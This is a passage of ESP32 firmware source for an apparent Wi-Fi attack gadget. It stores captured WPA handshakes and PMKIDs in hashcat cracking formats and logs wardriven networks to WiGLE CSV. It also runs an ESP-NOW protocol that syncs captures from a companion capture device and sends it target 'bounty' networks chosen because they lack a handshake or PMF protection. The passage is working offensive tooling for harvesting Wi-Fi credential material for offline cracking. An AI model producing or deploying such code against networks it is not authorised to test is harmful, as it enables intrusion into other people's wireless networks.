  for(int i=0;i<(int)eapol.len;i++){char h[3];snprintf(h,3,"%02x",eapol.data[i]);f.print(h);}
  f.print('*');
  f.println(msgPair,HEX);
  f.close();
  Serial.printf("[SD] saved HS: %s\n", fname);
}

// Write a single PMKID to SD as hashcat 16800 format
static void _sdSavePMKID(const CapturedPMKID& pm) {
  if (!sdAvailable) return;
  if (!SD.exists(SD_CAPTURES_DIR)) SD.mkdir(SD_CAPTURES_DIR);
  char fname[96], bssidStr[18];
  snprintf(bssidStr,sizeof(bssidStr),"%02x%02x%02x%02x%02x%02x",
    pm.bssid[0],pm.bssid[1],pm.bssid[2],pm.bssid[3],pm.bssid[4],pm.bssid[5]);
  snprintf(fname,sizeof(fname),"%s/%.20s_%s.16800",SD_CAPTURES_DIR,pm.ssid,bssidStr);
  File f = SD.open(fname, FILE_APPEND);
  if (!f) { Serial.println("[SD] pmkid write failed"); return; }
  // hashcat 16800: PMKID*APMAC*STAMAC*ESSID_HEX
  uint8_t essidLen = (uint8_t)strlen(pm.ssid);
  for(int i=0;i<16;i++){char h[3];snprintf(h,3,"%02x",pm.pmkid[i]);f.print(h);}
  f.print('*');
  for(int i=0;i<6;i++){char h[3];snprintf(h,3,"%02x",pm.bssid[i]);f.print(h);}
  f.print('*');
  for(int i=0;i<6;i++){char h[3];snprintf(h,3,"%02x",pm.station[i]);f.print(h);}
  f.print('*');
  for(int i=0;i<essidLen;i++){char h[3];snprintf(h,3,"%02x",(uint8_t)pm.ssid[i]);f.print(h);}
  f.println();
  f.close();
  Serial.printf("[SD] saved PMKID: %s\n", fname);
}

void saveHandshakeToSD(const CapturedHandshake& hs) { _sdSaveHS(hs); }
void savePMKIDToSD(const CapturedPMKID& pm)          { _sdSavePMKID(pm); }

void saveHandshakes() {
  if (!_mounted && !mount()) return;
  const auto& hs = OinkMode::getHandshakes();
  uint8_t n = hs.size() < SPIFFS_MAX_SAVES ? hs.size() : SPIFFS_MAX_SAVES;
  File f = SPIFFS.open(SPIFFS_HS_PATH, FILE_WRITE);
  if (!f) { Serial.println("[SPIFFS] hs write failed"); return; }
  f.write(&n, 1);
  for (uint8_t i=0; i<n; i++) f.write((const uint8_t*)&hs[i], sizeof(CapturedHandshake));
  f.close();
  Serial.printf("[SPIFFS] saved %d handshakes\n", n);
  // Mirror to SD
  for (uint8_t i=0; i<n; i++) if (!hs[i].saved) _sdSaveHS(hs[i]);
}

void savePMKIDs() {
  if (!_mounted && !mount()) return;
  const auto& pm = OinkMode::getPMKIDs();
  uint8_t n = pm.size() < SPIFFS_MAX_SAVES ? pm.size() : SPIFFS_MAX_SAVES;
  File f = SPIFFS.open(SPIFFS_PMKID_PATH, FILE_WRITE);
  if (!f) { Serial.println("[SPIFFS] pmkid write failed"); return; }
  f.write(&n, 1);
  for (uint8_t i=0; i<n; i++) f.write((const uint8_t*)&pm[i], sizeof(CapturedPMKID));
  f.close();
  Serial.printf("[SPIFFS] saved %d PMKIDs\n", n);
  for (uint8_t i=0; i<n; i++) if (!pm[i].saved) _sdSavePMKID(pm[i]);
}

void saveAll() {
  saveHandshakes();
  savePMKIDs();
}

// Save WiGLE CSV of wardriven networks to SD
void saveWigleCSV() {
  if (!sdAvailable) return;
  const char* WIGLE_DIR = "/porkchop/wigle";
  if (!SD.exists(WIGLE_DIR)) SD.mkdir(WIGLE_DIR);
  // Filename: /porkchop/wigle/YYYYMMDD_HHMMSS.csv (use uptime as proxy since no RTC)
  char fname[80];
  uint32_t up = millis() / 1000;
  snprintf(fname, sizeof(fname), "%s/wardrive_%06lu.csv", WIGLE_DIR, up);
  File f = SD.open(fname, FILE_WRITE);
  if (!f) { Serial.println("[SD] WiGLE CSV open failed"); return; }
  // WiGLE CSV header
  f.println("WigleWifi-1.4,appRelease=PorkChopCYD,model=ESP32,release=1.0,device=CYD,display=Yes,board=ESP32,brand=Espressif");
  f.println("MAC,SSID,AuthMode,FirstSeen,Channel,Frequency,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type");
  // Write all networks from NetworkRecon
  NetworkRecon::enterCritical();
  const auto& nets = NetworkRecon::getNetworks();
  uint32_t count = 0;
  for (const auto& n : nets) {
    char auth[16] = "[ESS]";
    if      (n.authmode == WIFI_AUTH_WPA3_PSK)           strncpy(auth, "[WPA3-SAE-CCMP][ESS]", sizeof(auth)-1);
    else if (n.authmode == WIFI_AUTH_WPA2_WPA3_PSK)      strncpy(auth, "[WPA2-PSK-CCMP][WPA3-SAE-CCMP][ESS]", sizeof(auth)-1);
    else if (n.authmode == WIFI_AUTH_WPA2_PSK)           strncpy(auth, "[WPA2-PSK-CCMP][ESS]", sizeof(auth)-1);
    else if (n.authmode == WIFI_AUTH_WPA_PSK)            strncpy(auth, "[WPA-PSK-TKIP][ESS]", sizeof(auth)-1);
    else if (n.authmode == WIFI_AUTH_WEP)                strncpy(auth, "[WEP][ESS]", sizeof(auth)-1);
    else if (n.authmode == WIFI_AUTH_OPEN)               strncpy(auth, "[ESS]", sizeof(auth)-1);
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             n.bssid[0],n.bssid[1],n.bssid[2],n.bssid[3],n.bssid[4],n.bssid[5]);
    int freq = 2412 + (n.channel - 1) * 5;
    // lat/lon: 0.0 if no GPS fix
    f.printf("%s,\"%s\",%s,1970-01-01 00:00:00,%d,%d,%d,0.000000,0.000000,0,100,WIFI\n",
             macStr, n.ssid, auth, n.channel, freq, n.rssi);
    count++;
  }
  NetworkRecon::exitCritical();
  f.close();
  Serial.printf("[SD] WiGLE CSV: %s (%lu nets)\n", fname, count);
}

void loadAll() {
  if (!_mounted && !mount()) return;

  // Load handshakes into OinkMode
  if (SPIFFS.exists(SPIFFS_HS_PATH)) {
    File f = SPIFFS.open(SPIFFS_HS_PATH, FILE_READ);
    if (f) {
      uint8_t n=0; f.read(&n,1);
      if (n > SPIFFS_MAX_SAVES) n = SPIFFS_MAX_SAVES;
      for (uint8_t i=0; i<n; i++) {
        CapturedHandshake hs;
        if (f.read((uint8_t*)&hs, sizeof(hs)) == sizeof(hs)) {
          hs.saved = true;  // mark as already persisted
          OinkMode::injectHandshake(hs);
        }
      }
      f.close();
      Serial.printf("[SPIFFS] loaded %d handshakes\n", n);
    }
  }

  // Load PMKIDs into OinkMode
  if (SPIFFS.exists(SPIFFS_PMKID_PATH)) {
    File f = SPIFFS.open(SPIFFS_PMKID_PATH, FILE_READ);
    if (f) {
      uint8_t n=0; f.read(&n,1);
      if (n > SPIFFS_MAX_SAVES) n = SPIFFS_MAX_SAVES;
      for (uint8_t i=0; i<n; i++) {
        CapturedPMKID pm;
        if (f.read((uint8_t*)&pm, sizeof(pm)) == sizeof(pm)) {
          pm.saved = true;
          OinkMode::injectPMKID(pm);
        }
      }
      f.close();
      Serial.printf("[SPIFFS] loaded %d PMKIDs\n", n);
    }
  }
}

void wipeAll() {
  if (!_mounted && !mount()) return;
  SPIFFS.remove(SPIFFS_HS_PATH);
  SPIFFS.remove(SPIFFS_PMKID_PATH);
  Serial.println("[SPIFFS] wiped all captures");
}

} // namespace SpiffsSave
// ============================================================
// PIGSYNC — ESP-NOW peer sync (POPS/Porkchop client side)
// Syncs captures from Sirloin (son device) to this CYD (papa)
// Protocol: pigsync_protocol.h — full reliable chunked transfer
// Trigger: BOAR_BROS mode from menu
// ============================================================
#include <esp_now.h>
#include <mbedtls/sha256.h>

// Pull in the full protocol definitions inline
// (constants, packet structs, helpers from pigsync_protocol.h adapted)
#define PIGSYNC_VERSION         0x30
#define PIGSYNC_MAGIC           0x50
static const uint8_t PIGSYNC_PMK[16] = {'S','O','N','O','F','A','P','I','G','K','E','Y','2','0','2','4'};
static const uint8_t PIGSYNC_LMK[16] = {'P','O','R','K','C','H','O','P','S','I','R','L','O','I','N','!'};
#define PIGSYNC_DISCOVERY_INTERVAL  100
#define PIGSYNC_DISCOVERY_TIMEOUT   5000
#define PIGSYNC_HELLO_TIMEOUT       15000
#define PIGSYNC_CHUNK_ACK_TIMEOUT   500
#define PIGSYNC_TRANSFER_TIMEOUT    60000
#define PIGSYNC_RETRY_COUNT         5
#define PIGSYNC_HELLO_RETRIES       6
#define PIGSYNC_MAX_PAYLOAD         238
#define PIGSYNC_TX_BUFFER_SIZE      2048
#define PIGSYNC_ACK_TIMEOUT         500
#define PIGSYNC_MAX_RETRIES         3
#define PIGSYNC_SEQ_WINDOW          64
#define PIGSYNC_DISCOVERY_CHANNEL   1
#define PIGSYNC_CHANNEL_SWITCH_MS   50
#define PIGSYNC_READY_TIMEOUT       5000
#define PIGSYNC_BEACON_INTERVAL     5000
#define PIGSYNC_FLAG_ACK_REQUIRED   0x01
#define PIGSYNC_FLAG_ENCRYPTED      0x02
#define CMD_DISCOVER        0x01
#define CMD_HELLO           0x02
#define CMD_READY           0x03
#define CMD_DISCONNECT      0x04
#define CMD_GET_COUNT       0x10
#define CMD_START_SYNC      0x11
#define CMD_ACK_CHUNK       0x12
#define CMD_MARK_SYNCED     0x13
#define CMD_PURGE           0x14
#define CMD_BOUNTIES        0x15
#define CMD_ABORT           0x16
#define CMD_TIME_SYNC       0x18
#define BEACON_GRUNT        0xB0
#define RSP_RING            0x80
#define RSP_BEACON          0x81
#define RSP_HELLO           0x82
#define RSP_READY           0x83
#define RSP_OK              0x84
#define RSP_ERROR           0x85
#define RSP_DISCONNECT      0x86
#define RSP_COUNT           0x90
#define RSP_CHUNK           0x91
#define RSP_COMPLETE        0x92
#define RSP_PURGED          0x93
#define RSP_BOUNTIES_ACK    0x94
#define RSP_TIME_SYNC       0x96
#define PIGSYNC_ERR_NO_CAPTURES     0x04
#define PIGSYNC_ERR_CRC_FAIL        0x06
#define CAPTURE_TYPE_PMKID      0x01
#define CAPTURE_TYPE_HANDSHAKE  0x02
#define DIALOGUE_TRACK_COUNT    3

#pragma pack(push, 1)
struct PigSyncHeader { uint8_t magic,version,type,flags,seq,ack; uint16_t sessionId; };
struct CmdDiscover   { PigSyncHeader hdr; uint8_t pops_mac[6]; };
struct RspBeacon     { PigSyncHeader hdr; uint8_t son_mac[6]; uint16_t pending; uint8_t flags,rssi; };
struct CmdHello      { PigSyncHeader hdr; };
struct RspHello      { PigSyncHeader hdr; uint16_t pmkid_count,hs_count; uint8_t dialogue_id,mood,data_channel,papa_hello_len; };
struct CmdReady      { PigSyncHeader hdr; };
struct RspReady      { PigSyncHeader hdr; uint16_t pmkid_count,hs_count,total_bytes,reserved; };
struct CmdStartSync  { PigSyncHeader hdr; uint8_t capture_type,reserved; uint16_t index; };
struct RspChunk      { PigSyncHeader hdr; uint16_t chunk_seq,chunk_total; };
struct CmdAckChunk   { PigSyncHeader hdr; uint16_t chunk_seq,reserved; };
struct RspComplete   { PigSyncHeader hdr; uint16_t total_bytes,reserved; uint32_t crc32; };
struct CmdMarkSynced { PigSyncHeader hdr; uint8_t capture_type,reserved; uint16_t index; };
struct CmdPurge      { PigSyncHeader hdr; uint8_t papa_goodbye_len; };
struct RspPurged     { PigSyncHeader hdr; uint16_t purged_count; uint8_t bounty_matches,matched_count; };
struct RspError      { PigSyncHeader hdr; uint8_t error_code,reserved; };
struct RspOk         { PigSyncHeader hdr; };
struct BeaconGrunt   { uint8_t magic,version,type,flags; uint8_t sirloinMac[6];
                       uint8_t captureCount,batteryPercent,storagePercent,wakeWindowSec;
                       uint32_t unixTime; uint16_t uptimeMin; char name[4]; };
#pragma pack(pop)

static const uint8_t PIGSYNC_DATA_CHANNELS[] = {3,4,8,9,13};
static const uint8_t PIGSYNC_DATA_CHANNEL_COUNT = 5;
inline uint8_t _ps_selectDataChannel(uint16_t sid) { return PIGSYNC_DATA_CHANNELS[sid%PIGSYNC_DATA_CHANNEL_COUNT]; }
inline uint32_t _ps_crc32(const uint8_t* data, size_t len) {
  uint32_t crc=0xFFFFFFFF;
  for(size_t i=0;i<len;i++){crc^=data[i];for(int j=0;j<8;j++)crc=(crc>>1)^(0xEDB88320&-(crc&1));}
  return ~crc;
}
inline void _ps_initHdr(PigSyncHeader* h,uint8_t t,uint8_t seq=0,uint8_t ack=0,uint16_t sid=0){
  h->magic=PIGSYNC_MAGIC; h->version=PIGSYNC_VERSION; h->type=t; h->flags=0; h->seq=seq; h->ack=ack; h->sessionId=sid;
}

static const char* const PAPA_HELLO[3]   = {"ABOUT TIME YOU SHOWED UP","WHERES MY PMKID MONEY","BACK FROM /DEV/OUTSIDE I SEE"};
static const char* const SON_HELLO[3]    = {"PAPA ITS YOUR FAVORITE MISTAKE","SURPRISE IM NOT IN JAIL","MISSED YOUR LAST 40 CALLS"};
static const char* const SON_GOODBYE[3]  = {"SAME ESP TIME SAME ESP CHANNEL","SIGTERM OLD MAN","/DEV/NULL YOUR CALLS"};
static const char* const PAPA_ROAST[3]   = {"ZERO PMKIDS? NOT MY SON","YOUR TCPDUMP IS EMPTY","SHOULD HAVE COMPILED YOU OUT"};
static const char* const SON_ROAST[3]    = {"SEGFAULT IN MY FEELINGS","CORE DUMPED MY SELF ESTEEM","MANS GOT NO CHILL OR HEAP"};

namespace PigSync {

// ── State ────────────────────────────────────────────────────
enum class State : uint8_t { IDLE, SCANNING, CONNECTING, RINGING, WAITING_READY,
                               CONNECTED, SYNCING, WAITING_CHUNKS, SYNC_COMPLETE, ERROR };

// SirloinDevice defined at global scope (before Display)
using ::SirloinDevice;

static State   _state         = State::IDLE;
static bool    _running       = false;
static bool    _initialized   = false;
static bool    _connected     = false;
static uint8_t _connMac[6]    = {0};
static uint16_t _sessionId    = 0;
static uint8_t _dataChannel   = PIGSYNC_DISCOVERY_CHANNEL;
static uint8_t _dialogueId    = 0;
static uint8_t _dialoguePhase = 0;
static uint32_t _callStart    = 0;
static uint32_t _phraseStart  = 0;
static char    _lastError[64] = {0};
static uint8_t _selectedIdx   = 0;

static uint16_t _remotePMKIDs  = 0;
static uint16_t _remoteHS      = 0;
static uint16_t _syncedPMKIDs  = 0;
static uint16_t _syncedHS      = 0;
static uint8_t  _lastBounty    = 0;

// Discovery
static bool    _scanning      = false;
static uint32_t _lastDiscover = 0;
static uint32_t _discoverStart= 0;
static std::vector<SirloinDevice> _devices;

// Transfer
#define PS_RX_BUF  2048
#define PS_CHUNK_Q 8
static uint8_t  _rxBuf[PS_RX_BUF] = {0};
static uint16_t _rxLen  = 0;
static uint8_t  _curType  = 0;
static uint16_t _curIdx   = 0;
static uint16_t _totalChunks = 0;
static uint16_t _rxChunks    = 0;
struct ChunkSlot { bool used; uint16_t seq,total,len; uint8_t data[256]; };
static ChunkSlot _chunkQ[PS_CHUNK_Q] = {};
static uint8_t   _chunkCount = 0;

// Reliability
static uint8_t  _txSeq   = 0;
static uint32_t _connectStart = 0;
static uint32_t _readyStart   = 0;
static uint8_t  _chanRetry    = 0;
static uint8_t  _helloRetry   = 0;
static uint32_t _lastHelloTx  = 0;
static uint32_t _lastPktTime  = 0;
static uint32_t _syncCompleteTime = 0;

// Control TX slot (one in-flight at a time)
static struct { bool waiting; uint8_t type,seq,retries; uint32_t lastSend;
                uint8_t mac[6]; uint8_t buf[160]; size_t len; } _ctrl = {};

// Pending flags (set in ISR callback, read in update())
static portMUX_TYPE _pmux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool _pendBeacon=false, _pendHello=false, _pendRing=false;
static volatile bool _pendReady=false, _pendComplete=false, _pendPurged=false;
static volatile bool _pendError=false, _pendChunk=false, _pendDisconnect=false;
static volatile bool _pendGrunt=false;
static volatile uint8_t _pendBeaconMac[6]={0}; static volatile int8_t _pendBeaconRSSI=0;
static volatile uint16_t _pendBeaconCaptures=0; static volatile uint8_t _pendBeaconFlags=0;
static volatile uint16_t _pendPMKIDs=0, _pendHS=0, _pendSessId=0;
static volatile uint8_t  _pendDialId=0, _pendMood=128, _pendDataCh=PIGSYNC_DISCOVERY_CHANNEL;
static volatile uint16_t _pendTotalBytes=0; static volatile uint32_t _pendCRC=0;
static volatile uint16_t _pendPurgedCnt=0; static volatile uint8_t _pendBounty=0;
static volatile uint8_t  _pendErrCode=0;
static volatile uint8_t  _pendGruntMac[6]={0}; static volatile uint8_t _pendGruntBatt=0;
static volatile uint8_t  _pendGruntCaps=0; static volatile char _pendGruntName[5]={0};

static esp_now_peer_info_t _peer = {};

// ESP-NOW callbacks — core 3.x signatures
static void IRAM_ATTR _onRecv(const esp_now_recv_info_t* info, const uint8_t* data, int len) {
  if (!info || !data || len < 3) return;
  const uint8_t* mac = info->src_addr;
  // BeaconGrunt check
  if (len >= (int)sizeof(BeaconGrunt) && data[0]==PIGSYNC_MAGIC && data[2]==BEACON_GRUNT) {
    const BeaconGrunt* g = (const BeaconGrunt*)data;
    taskENTER_CRITICAL(&_pmux);
    memcpy((void*)_pendGruntMac, g->sirloinMac, 6);
    _pendGruntBatt=g->batteryPercent; _pendGruntCaps=g->captureCount;
    memcpy((void*)_pendGruntName, g->name, 4); _pendGruntName[4]=0;
    _pendGrunt=true;
    taskEXIT_CRITICAL(&_pmux);
    return;
  }
  if (len < (int)sizeof(PigSyncHeader)) return;
  const PigSyncHeader* hdr = (const PigSyncHeader*)data;
  if (hdr->magic!=PIGSYNC_MAGIC || hdr->version!=PIGSYNC_VERSION) return;
  // Session validation for bound responses
  if (hdr->sessionId!=0 && _sessionId!=0 && hdr->sessionId!=_sessionId) return;

  taskENTER_CRITICAL(&_pmux);
  _lastPktTime = millis();
  switch(hdr->type) {
    case RSP_BEACON: if(len>=(int)sizeof(RspBeacon)){
        const RspBeacon*r=(const RspBeacon*)data;
        memcpy((void*)_pendBeaconMac,mac,6); _pendBeaconRSSI=r->rssi;
        _pendBeaconCaptures=r->pending; _pendBeaconFlags=r->flags; _pendBeacon=true; } break;
    case RSP_RING:   _pendRing=true; break;
    case RSP_HELLO:  if(len>=(int)sizeof(RspHello)){
        const RspHello*r=(const RspHello*)data;
        _pendPMKIDs=r->pmkid_count; _pendHS=r->hs_count;
        _pendDialId=r->dialogue_id%DIALOGUE_TRACK_COUNT; _pendMood=r->mood;
        _pendSessId=r->hdr.sessionId; _pendDataCh=r->data_channel; _pendHello=true; } break;
    case RSP_READY:  if(len>=(int)sizeof(RspReady)){
        const RspReady*r=(const RspReady*)data;
        _pendPMKIDs=r->pmkid_count; _pendHS=r->hs_count; _pendReady=true; } break;
    case RSP_CHUNK:  if(len>=(int)sizeof(RspChunk)){
        const RspChunk*r=(const RspChunk*)data;
        uint16_t dLen=len-sizeof(RspChunk); if(dLen>256)dLen=256;
        int slot=-1;
        for(uint8_t i=0;i<PS_CHUNK_Q;i++) if(_chunkQ[i].used&&_chunkQ[i].seq==r->chunk_seq){slot=i;break;}
        if(slot<0) for(uint8_t i=0;i<PS_CHUNK_Q;i++) if(!_chunkQ[i].used){slot=i;break;}
        if(slot>=0){ auto&e=_chunkQ[slot]; if(!e.used)_chunkCount++;
          e.used=true;e.seq=r->chunk_seq;e.total=r->chunk_total;e.len=dLen;
          memcpy(e.data,data+sizeof(RspChunk),dLen); _pendChunk=true; } } break;
    case RSP_COMPLETE: if(len>=(int)sizeof(RspComplete)){
        const RspComplete*r=(const RspComplete*)data;
        _pendTotalBytes=r->total_bytes; _pendCRC=r->crc32; _pendComplete=true; } break;
    case RSP_PURGED: if(len>=(int)sizeof(RspPurged)){
        const RspPurged*r=(const RspPurged*)data;
        _pendPurgedCnt=r->purged_count; _pendBounty=r->bounty_matches; _pendPurged=true; } break;
    case RSP_ERROR:  if(len>=(int)sizeof(RspError)){
        const RspError*r=(const RspError*)data; _pendErrCode=r->error_code; _pendError=true; } break;
    case RSP_DISCONNECT: _pendDisconnect=true; break;
    default: break;
  }
  taskEXIT_CRITICAL(&_pmux);
}

static void _onSent(const wifi_tx_info_t* info, esp_now_send_status_t st) {
  (void)info; (void)st;
}

// ── Send helpers ─────────────────────────────────────────────
static void _rawSend(const uint8_t* mac, const uint8_t* buf, size_t len) {
  esp_now_send(mac, buf, len);
}
static void _sendCtrl(const uint8_t* mac, const uint8_t* buf, size_t len, uint8_t type) {
  if(len>160) return;
  if(!_ctrl.waiting) {
    memcpy(_ctrl.buf,buf,len); _ctrl.len=len; _ctrl.type=type;
    _ctrl.seq=_txSeq; memcpy(_ctrl.mac,mac,6);
    _ctrl.retries=0; _ctrl.waiting=true; _ctrl.lastSend=millis();
    esp_now_send(_ctrl.mac,_ctrl.buf,_ctrl.len);
  }
}

static void _sendDiscover() {
  uint8_t ownMac[6]; esp_wifi_get_mac(WIFI_IF_STA,ownMac);
  CmdDiscover pkt; _ps_initHdr(&pkt.hdr,CMD_DISCOVER,_txSeq++,0,0);
  memcpy(pkt.pops_mac,ownMac,6);
  uint8_t bcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  esp_now_peer_info_t p={}; memcpy(p.peer_addr,bcast,6); p.channel=PIGSYNC_DISCOVERY_CHANNEL; p.encrypt=false;
  if(!esp_now_is_peer_exist(bcast)) esp_now_add_peer(&p);
  _rawSend(bcast,(uint8_t*)&pkt,sizeof(pkt));
}

static void _sendHello() {
  CmdHello pkt; _ps_initHdr(&pkt.hdr,CMD_HELLO,_txSeq,0,0);
  _sendCtrl(_connMac,(uint8_t*)&pkt,sizeof(pkt),CMD_HELLO);
  _lastHelloTx=millis();
}

static void _sendReady() {
  CmdReady pkt; _ps_initHdr(&pkt.hdr,CMD_READY,_txSeq++,0,_sessionId);
  _sendCtrl(_connMac,(uint8_t*)&pkt,sizeof(pkt),CMD_READY);
}

static void _sendStartSync(uint8_t type, uint16_t idx) {
  CmdStartSync pkt; _ps_initHdr(&pkt.hdr,CMD_START_SYNC,_txSeq++,0,_sessionId);
  pkt.capture_type=type; pkt.reserved=0; pkt.index=idx;
  _rawSend(_connMac,(uint8_t*)&pkt,sizeof(pkt));
}

static void _sendAckChunk(uint16_t seq) {
  CmdAckChunk pkt; _ps_initHdr(&pkt.hdr,CMD_ACK_CHUNK,_txSeq++,0,_sessionId);
  pkt.chunk_seq=seq; pkt.reserved=0;
  _rawSend(_connMac,(uint8_t*)&pkt,sizeof(pkt));
}

static void _sendMarkSynced(uint8_t type, uint16_t idx) {
  CmdMarkSynced pkt; _ps_initHdr(&pkt.hdr,CMD_MARK_SYNCED,_txSeq++,0,_sessionId);
  pkt.capture_type=type; pkt.reserved=0; pkt.index=idx;
  _rawSend(_connMac,(uint8_t*)&pkt,sizeof(pkt));
}

static void _sendPurge() {
  uint8_t buf[64]; CmdPurge* pkt=(CmdPurge*)buf;
  _ps_initHdr(&pkt->hdr,CMD_PURGE,_txSeq++,0,_sessionId);
  uint16_t tot=_syncedPMKIDs+_syncedHS;
  const char* goodbye = (tot==0)?"EMPTY HANDED AGAIN":
                        (tot<=3)?"BETTER THAN NOTHING":
                        (tot<=7)?"NOT BAD KID":
                        (tot<=10)?"ADDED TO INHERITANCE.TXT":"LEGENDARY HAUL";
  uint8_t gLen=(uint8_t)strlen(goodbye);
  pkt->papa_goodbye_len=gLen;
  memcpy(buf+sizeof(CmdPurge),goodbye,gLen);
  _rawSend(_connMac,buf,sizeof(CmdPurge)+gLen);
}

static void _sendDisconnectCmd() {
  uint8_t buf[sizeof(PigSyncHeader)]; PigSyncHeader* h=(PigSyncHeader*)buf;
  _ps_initHdr(h,CMD_DISCONNECT,_txSeq++,0,_sessionId);
  _rawSend(_connMac,buf,sizeof(buf));
}

static void _sendBounties() {
  // Send any bounty BSSIDs (from our current network list — target APs we want captures for)
  NetworkRecon::enterCritical();
  const auto& nets = NetworkRecon::getNetworks();
  uint8_t cnt=0; uint8_t bssids[15*6]={0};
  for(const auto& n:nets){
    if(cnt>=15) break;
    if(!n.hasHandshake && !n.hasPMF && n.ssid[0])
      { memcpy(bssids+cnt*6,n.bssid,6); cnt++; }
  }
  NetworkRecon::exitCritical();
  if(cnt==0) return;
  uint8_t buf[10+15*6];
  // Manually build header + count
  PigSyncHeader* hdr=(PigSyncHeader*)buf;
  _ps_initHdr(hdr,CMD_BOUNTIES,_txSeq++,0,_sessionId);
  buf[8]=cnt; buf[9]=0;
  memcpy(buf+10,bssids,cnt*6);
  _rawSend(_connMac,buf,10+cnt*6);
}

// ── Deserialize captured data from Sirloin ───────────────────
static bool _parsePMKID(const uint8_t* data, uint16_t len, CapturedPMKID& out) {
  if(!data||len<65) return false;
  memset(&out,0,sizeof(out));
  memcpy(out.bssid,data,6); memcpy(out.station,data+6,6);
  uint8_t ssidLen=data[12]; if(ssidLen>32) ssidLen=32;
  memcpy(out.ssid,data+13,ssidLen); out.ssid[ssidLen]=0;
  memcpy(out.pmkid,data+45,16);
  out.timestamp=millis(); out.saved=false; out.saveAttempts=0;
  return true;
}

static bool _parseHS(const uint8_t* data, uint16_t len, CapturedHandshake& out) {
  if(!data||len<48) return false;
  memset(&out,0,sizeof(out));
  memcpy(out.bssid,data,6); memcpy(out.station,data+6,6);
  uint8_t ssidLen=data[12]; if(ssidLen>32) ssidLen=32;
  memcpy(out.ssid,data+13,ssidLen); out.ssid[ssidLen]=0;
  size_t off=46; // skip mask byte at 45
  out.capturedMask=0;
  while(off<len) {
    if(off+2>len) break;
    uint16_t fLen=data[off]|(data[off+1]<<8); off+=2;
    if(off+fLen>len) break;
    const uint8_t* fData=data+off; off+=fLen;
    if(off+2>len) break;
    uint16_t fullLen=data[off]|(data[off+1]<<8); off+=2;
    if(off+fullLen+6>len) break;
    const uint8_t* fullData=data+off; off+=fullLen;
    uint8_t msgNum=data[off++]; int8_t rssi=(int8_t)data[off++];
    uint32_t ts=data[off]|(data[off+1]<<8)|(data[off+2]<<16)|(data[off+3]<<24); off+=4;
    if(msgNum<1||msgNum>4) continue;
    EAPOLFrame& fr=out.frames[msgNum-1];
    uint16_t cp=fLen<sizeof(fr.data)?fLen:(uint16_t)sizeof(fr.data);
    memcpy(fr.data,fData,cp); fr.len=cp;
    uint16_t fcp=fullLen<sizeof(fr.fullFrame)?fullLen:(uint16_t)sizeof(fr.fullFrame);
    if(fcp>0){memcpy(fr.fullFrame,fullData,fcp);} fr.fullFrameLen=fcp;
    fr.messageNum=msgNum; fr.rssi=rssi; fr.timestamp=ts;
    out.capturedMask|=(1<<(msgNum-1));
  }
  if(out.capturedMask==0) return false;
  out.firstSeen=out.lastSeen=millis(); out.saved=false; out.saveAttempts=0;
  return true;
}

// ── Lifecycle ─────────────────────────────────────────────────
void init() {
  if(_initialized) return;
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
  esp_wifi_set_channel(PIGSYNC_DISCOVERY_CHANNEL,WIFI_SECOND_CHAN_NONE);
  _dataChannel=PIGSYNC_DISCOVERY_CHANNEL;
  if(esp_now_init()!=ESP_OK){ Serial.println("[PIGSYNC] ESP-NOW init failed"); return; }
  esp_now_set_pmk(PIGSYNC_PMK);
  esp_now_register_recv_cb(_onRecv);
  esp_now_register_send_cb(_onSent);
  _initialized=true;
  Serial.println("[PIGSYNC] init OK");
}

void start() {
  if(_running) return;
  NetworkRecon::pause();
  WiFi.mode(WIFI_STA); WiFi.disconnect(false,true); delay(100);
  init();
  _devices.clear(); _devices.reserve(8);
  _state=State::IDLE; _connected=false; memset(_connMac,0,6);
  _sessionId=0; _remotePMKIDs=0; _remoteHS=0;
  _syncedPMKIDs=0; _syncedHS=0; _lastBounty=0;
  _rxLen=0; _lastError[0]=0; _dialoguePhase=0; _callStart=0;
  _ctrl={}; _chunkCount=0; for(auto&c:_chunkQ)c.used=false;
  for(volatile bool* f:{&_pendBeacon,&_pendHello,&_pendRing,&_pendReady,
      &_pendComplete,&_pendPurged,&_pendError,&_pendChunk,&_pendDisconnect,&_pendGrunt})
    *f=false;
  _running=true;
  // Auto-start scanning
  _scanning=true; _discoverStart=millis(); _lastDiscover=0;
  _state=State::SCANNING;
  Serial.println("[PIGSYNC] started scanning");
}

void stop() {
  if(!_running) return;
  _running=false; _scanning=false;
  if(_connected){ _sendDisconnectCmd(); delay(20); esp_now_del_peer(_connMac); _connected=false; }
  if(_initialized){ esp_now_deinit(); _initialized=false; }
  NetworkRecon::resume();
  Serial.println("[PIGSYNC] stopped");
}

// ── Main update loop ─────────────────────────────────────────
void update() {
  if(!_running) return;
  uint32_t now=millis();

  // ── Control retry ──
  if(_ctrl.waiting && now-_ctrl.lastSend>PIGSYNC_ACK_TIMEOUT) {
    _ctrl.retries++;
    uint8_t maxR = (_ctrl.type==CMD_HELLO||_ctrl.type==CMD_READY) ? 30 : PIGSYNC_MAX_RETRIES;
    if(_ctrl.retries>=maxR) {
      snprintf(_lastError,sizeof(_lastError),"Handshake timeout");
      _state=State::ERROR; _ctrl.waiting=false; return;
    }
    _ctrl.lastSend=now; esp_now_send(_ctrl.mac,_ctrl.buf,_ctrl.len);
  }

  // ── Session timeout ──
  if(_connected && _lastPktTime>0 && now-_lastPktTime>60000) {
    snprintf(_lastError,sizeof(_lastError),"Connection lost");
    esp_now_del_peer(_connMac); _connected=false; memset(_connMac,0,6);
    esp_wifi_set_channel(PIGSYNC_DISCOVERY_CHANNEL,WIFI_SECOND_CHAN_NONE);
    _dataChannel=PIGSYNC_DISCOVERY_CHANNEL; _state=State::IDLE; _lastPktTime=0;
  }

  // ── Process pending disconnect ──
  if(_pendDisconnect) {
    taskENTER_CRITICAL(&_pmux); _pendDisconnect=false; taskEXIT_CRITICAL(&_pmux);
    if(_connected){esp_now_del_peer(_connMac);_connected=false;}
    memset(_connMac,0,6);
    esp_wifi_set_channel(PIGSYNC_DISCOVERY_CHANNEL,WIFI_SECOND_CHAN_NONE);
    _dataChannel=PIGSYNC_DISCOVERY_CHANNEL; _ctrl={}; _state=State::IDLE;
    Serial.println("[PIGSYNC] remote disconnected");
  }

  // ── Discovery: prune stale + send CmdDiscover ──
